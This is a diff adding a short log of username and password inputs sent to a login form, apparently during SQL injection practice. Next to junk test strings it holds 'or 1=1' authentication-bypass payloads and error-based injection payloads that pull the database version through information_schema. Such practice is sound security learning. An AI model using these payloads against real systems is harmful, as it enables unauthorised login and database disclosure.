@@ -1,0 +1,14 @@
+User Name:sadasdasdas
+Password:sadasd
+User Name:admin" or 1=1 #
+Password:admin' or 1=1 #
+User Name:asd
+Password:asd
+User Name:dumb
+Password:dumb
+User Name:1333')   select count(*),concat('=', (select version()), '=', floor(rand ()*2)) abc from information_schema.columns #
+Password:1333')   select count(*),concat('=', (select version()), '=', floor(rand ()*2)) abc from information_schema.columns #
+User Name:1333")   select count(*),concat('=', (select version()), '=', floor(rand ()*2)) abc from information_schema.columns #
+Password:1333")   select count(*),concat('=', (select version()), '=', floor(rand ()*2)) abc from information_schema.columns #
+User Name:adsadasd'''''
+Password:asdadasda;;;''''
